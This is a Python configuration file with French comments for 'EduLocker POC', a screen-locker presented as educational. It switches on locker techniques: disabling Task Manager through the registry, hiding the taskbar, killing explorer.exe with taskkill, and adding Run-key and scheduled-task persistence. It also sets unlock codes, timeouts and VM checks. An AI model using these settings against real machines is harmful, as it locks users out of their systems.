# config/settings.py
# Configuration complète pour EduLocker POC
from config.messages import get_messages

POC_CONFIG = {
    # Configurations générales et de sécurité POC existantes
    "debug_mode": True,
    "educational_mode": True,
    "vm_detection_bypass": False,
    
    "lock_config": {
        # Interface de verrouillage de base
        "fullscreen": True,
        "topmost": True,
        
        # Mode agressif - ATTENTION: À utiliser uniquement en environnement contrôlé (VM isolée)
        "aggressive_mode": True,  # Interrupteur principal pour toutes les fonctions agressives
        
        # Désactivation du Gestionnaire des tâches via registre Windows
        "force_disable_task_manager": True,  # Modifie HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr
        
        # Masquage de la barre des tâches Windows
        "force_hide_taskbar": True,  # Utilise ShowWindow() sur Shell_TrayWnd
        
        # Gestion du processus explorer.exe - TRÈS RISQUÉ
        "kill_explorer_on_lock": True,  # Termine brutalement explorer.exe (taskkill /F /IM explorer.exe)
        "restart_explorer_on_unlock": True,  # Redémarre explorer.exe lors du déverrouillage
        
        # Paramètres de monitoring agressif
        "aggressive_focus_enforcement": True,  # Force le focus sur la fenêtre toutes les 0.5s en mode agressif
        "monitoring_interval": 0.1,  # Intervalle de surveillance en secondes
    },
    
    "persistence_config": {
        # Configuration de persistance existante à compléter selon vos besoins
        "startup_persistence": True,
        "registry_persistence": True,
        "scheduled_task_persistence": True,
        "name": "EduLockerServicePOC",
        "description": "Educational Locker Persistence POC",
        "use_registry_run_key": True,   # Mettez à True pour activer
        "use_scheduled_task": True,     # Mettez à True pour activer
    },
    
    "evasion_config": {
        # Configuration d'évasion existante à compléter selon vos besoins
        "anti_vm_detection": False,
        "anti_analysis": False,
        "obfuscation_level": "none",
    },
    
    "ui_config": {
        # Configuration de l'interface utilisateur
        "background_color": "#1a1a1a",  # Couleur de fond sombre
        "text_color": "#ffffff",        # Texte blanc
        "font_family": "Arial",         # Police par défaut
        "title_font_size": 32,          # Taille de police du titre
        "message_font_size": 16,        # Taille de police du message principal
        "button_font_size": 14,         # Taille de police des boutons
    },
    
    "messages": get_messages(),
    
    "safety_config": {
        # Configuration de sécurité POC
        "max_attempts": 5,              # Nombre maximum de tentatives de déverrouillage
        "unlock_code": "UNLOCK2024",      # Code de déverrouillage par défaut (à changer)
        "emergency_exit": "EMERGENCY_EXIT_123",  # Code d'urgence pour sortie forcée
        "timeout_minutes": 10,          # Auto-déverrouillage après X minutes
        
        # Codes de sécurité additionnels
        "admin_override": "ADMIN_OVERRIDE_456",  # Code d'administrateur
        "safe_mode_key": "SAFE_MODE_789",        # Code pour mode sécurisé
        
        # Limitations de sécurité
        "max_lock_duration": 60,        # Durée maximum de verrouillage (minutes)
        "force_vm_check": True,         # Vérification obligatoire de VM
        "require_admin_confirm": True,  # Confirmation administrateur requise
    },
    
    # Configuration système spécifique
    "system_config": {
        "windows_only": True,           # Limite aux systèmes Windows
        "min_windows_version": "10",    # Version Windows minimum
        "require_elevated_privileges": False,  # Privilèges élevés requis
        
        # Vérifications de sécurité système
        "check_antivirus": True,        # Vérifier la présence d'antivirus
        "check_vm_environment": True,   # Vérifier si dans une VM
        "log_system_info": True,        # Enregistrer les infos système
    },
    
    # Configuration de logging
    "logging_config": {
        "log_level": "INFO",            # Niveau de log (DEBUG, INFO, WARNING, ERROR)
        "log_to_file": True,            # Enregistrer dans un fichier
        "log_file_path": "edulocker.log",  # Chemin du fichier de log
        "max_log_size_mb": 10,         # Taille maximum du fichier de log
        "backup_count": 3,             # Nombre de fichiers de sauvegarde
    },
    
    # Configuration de récupération d'urgence
    "recovery_config": {
        "emergency_unlock_methods": [
            "timeout",                  # Déverrouillage automatique par timeout
            "emergency_code",          # Code d'urgence
            "admin_override",          # Surcharge administrateur
            "safe_reboot"              # Redémarrage sécurisé
        ],
        "auto_recovery_enabled": True,  # Récupération automatique activée
        "recovery_check_interval": 30,  # Intervalle de vérification (secondes)
    }
}

# Validation de configuration
def validate_config():
    """Valide la configuration et affiche des avertissements pour les options dangereuses"""
    warnings = []
    
    if POC_CONFIG["lock_config"]["aggressive_mode"]:
        warnings.append("⚠️  MODE AGRESSIF ACTIVÉ - Utilisation recommandée uniquement en VM isolée")
    
    if POC_CONFIG["lock_config"]["kill_explorer_on_lock"]:
        warnings.append("🚨 TRÈS DANGEREUX: Terminaison d'explorer.exe activée")
    
    if POC_CONFIG["lock_config"]["force_disable_task_manager"]:
        warnings.append("⚠️  Désactivation du Gestionnaire des tâches activée")
    
    if POC_CONFIG["safety_config"]["unlock_code"] in ["", "DEMO2024"]:
        warnings.append("🔓 Code de déverrouillage par défaut détecté - Changez-le!")
    
    if warnings:
        print("\n" + "="*60)
        print("🚨 AVERTISSEMENTS DE CONFIGURATION:")
        print("="*60)
        for warning in warnings:
            print(f"  {warning}")
        print("="*60 + "\n")
    
    return len(warnings) == 0

# Configuration d'environnement recommandée
RECOMMENDED_ENVIRONMENT = {
    "platform": "Windows 10/11",
    "virtualization": "VMware/VirtualBox (OBLIGATOIRE pour tests)",
    "network": "Isolé du réseau principal",
    "backups": "Snapshot VM avant utilisation",
    "monitoring": "Logs système activés",
    "recovery": "Plan de récupération documenté"
}

# Appel de validation au chargement
if __name__ == "__main__":
    validate_config()